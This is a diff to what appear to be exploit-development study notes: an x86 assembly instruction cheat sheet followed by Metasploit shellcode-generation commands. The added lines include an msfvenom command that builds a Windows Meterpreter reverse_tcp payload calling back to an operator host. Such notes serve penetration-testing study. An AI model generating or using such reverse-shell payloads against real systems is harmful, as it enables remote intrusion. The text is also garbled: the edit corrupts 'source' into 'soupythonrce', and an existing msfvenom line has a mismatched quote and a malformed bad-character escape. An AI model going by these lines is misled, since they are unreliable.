@@ -29,7 +29,7 @@ POP Pop top of stack to destination
 INC Increment source by 1
 DEC Decrement source by 1
 ADD Add source to destination
-SUB Subtract source from destination
+SUB Subtract soupythonrce from destination
 CMP Compare 2 values by subtracting them and setting the %RFLAGS register. ZeroFlag set means they are the same.
 JMP Jump to specified location
 JLE Jump if less than or equal
@@ -57,3 +57,5 @@ show options
 set CMD 'whoami && ip a'
 generate -b '\x00' -f python
 msfvenom -p linux/x86/exec CMD="whoami && ifconfig' -b 'x00' -f python
+----------------------------------------------------------------------------------------------------
+msfvenom -p windows/meterpreter/reverse_tcp lhost=<LIN_OPS> 
